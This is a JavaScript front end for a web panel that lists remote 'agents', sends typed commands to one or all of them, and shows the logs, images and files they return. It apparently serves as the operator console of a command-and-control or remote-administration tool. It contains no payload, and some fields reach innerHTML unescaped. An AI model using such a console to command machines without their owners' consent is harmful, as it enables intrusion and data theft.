let currentAgent = null;
let lastLogId = 0;
let agentsData = []; // Store full agent objects

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    // Poll for agents and logs
    setInterval(fetchAgents, 2000);
    setInterval(fetchLogs, 1000);

    // Handle Command Input
    const cmdInput = document.getElementById('cmd-input');
    cmdInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const cmd = cmdInput.value.trim();
            if (cmd) {
                sendCommand(cmd);
                cmdInput.value = '';
            }
        }
    });
});

// Fetch Agents List
async function fetchAgents() {
    try {
        const response = await fetch('/api/agents');
        const agents = await response.json();

        if (!agents) return;

        // Update local data
        agentsData = agents;
        renderAgentsList();

    } catch (error) {
        console.error('Error fetching agents:', error);
    }
}

// Render Agents List
function renderAgentsList() {
    const listContainer = document.getElementById('agents-list');
    // Don't clear everything to avoid flickering, but for simplicity we rebuild
    // Ideally we should diff, but for now let's just rebuild.
    listContainer.innerHTML = '';

    // Add "ALL" option
    const allItem = document.createElement('div');
    allItem.className = `agent-item ${currentAgent === 'ALL' ? 'active' : ''}`;
    allItem.innerHTML = `
        <div class="agent-name">ALL AGENTS</div>
        <div class="agent-status">Broadcast</div>
    `;
    allItem.onclick = () => selectAgent('ALL');
    listContainer.appendChild(allItem);

    // Add individual agents
    // agentsData is now an array of objects: {name, status, lastSeen}
    agentsData.forEach(agent => {
        const item = document.createElement('div');
        item.className = `agent-item ${currentAgent === agent.name ? 'active' : ''}`;
        
        const statusColor = agent.status === 'Online' ? '#00ff00' : '#555';
        
        item.innerHTML = `
            <div class="agent-name">
                <span style="color: ${statusColor};">●</span> ${agent.name}
            </div>
            <div class="agent-status">${agent.status} - ${agent.lastSeen}</div>
        `;
        item.onclick = () => selectAgent(agent.name);
        listContainer.appendChild(item);
    });
}

// Select Agent
function selectAgent(agent) {
    currentAgent = agent;
    
    // Update UI
    document.getElementById('empty-state').style.display = 'none';
    document.getElementById('agent-dashboard').style.display = 'flex';
    
    // Update active state in list
    renderAgentsList();

    // Clear terminal and reload logs for this agent
    document.getElementById('terminal-container').innerHTML = '';
    lastLogId = 0; // Reset log counter to fetch all history
    fetchLogs();
}

// Send Command
async function sendCommand(command) {
    if (!currentAgent) return;

    // Optimistic UI update
    addLogToTerminal({
        source: 'Server',
        content: `> ${command}`,
        timestamp: new Date().toISOString()
    });

    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agent: currentAgent,
                command: command
            })
        });
    } catch (error) {
        console.error('Error sending command:', error);
        addLogToTerminal({
            source: 'Error',
            content: 'Failed to send command.',
            timestamp: new Date().toISOString()
        });
    }
}

// Fetch Logs
async function fetchLogs() {
    if (!currentAgent) return;

    try {
        const response = await fetch(`/api/logs?since=${lastLogId}`);
        const logs = await response.json();

        if (!logs || logs.length === 0) return;

        logs.forEach(log => {
            lastLogId = Math.max(lastLogId, log.id);
            
            // Filter logs: Show if source is the current agent OR if source is Server (commands sent)
            // Note: Server logs don't have a target field in the current backend implementation, 
            // so we show all server logs or try to filter by content if possible.
            // For now, we show all logs if "ALL" is selected, or filter by source if specific agent.
            
            if (currentAgent === 'ALL' || log.source === currentAgent || log.source === 'Server') {
                addLogToTerminal(log);
            }
        });
    } catch (error) {
        console.error('Error fetching logs:', error);
    }
}

// Add Log to Terminal
function addLogToTerminal(log) {
    const container = document.getElementById('terminal-container');
    const entry = document.createElement('div');
    entry.className = 'log-entry';

    const time = new Date(log.timestamp).toLocaleTimeString();
    
    let contentHtml = '';
    if (log.content.startsWith('[IMAGE]')) {
        const url = log.content.replace('[IMAGE] ', '');
        contentHtml = `<div class="log-content"><a href="${url}" target="_blank"><img src="${url}" class="log-image"></a></div>`;
    } else if (log.content.startsWith('[FILE]')) {
        // Format: [FILE] filename | url
        const parts = log.content.replace('[FILE] ', '').split(' | ');
        const filename = parts[0];
        const url = parts[1];
        contentHtml = `<div class="log-content">
            <a href="${url}" target="_blank" style="color: #00ffff; text-decoration: none; border: 1px solid #00ffff; padding: 5px; display: inline-block; margin-top: 5px;">
                [DOWNLOAD] ${escapeHtml(filename)}
            </a>
        </div>`;
    } else {
        contentHtml = `<span class="log-content">${escapeHtml(log.content)}</span>`;
    }

    entry.innerHTML = `
        <span style="color: #555;">[${time}]</span>
        <span class="log-source" style="color: ${log.source === 'Server' ? '#fff' : '#00ff00'};">${log.source}:</span>
        ${contentHtml}
    `;

    container.appendChild(entry);
    container.scrollTop = container.scrollHeight;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
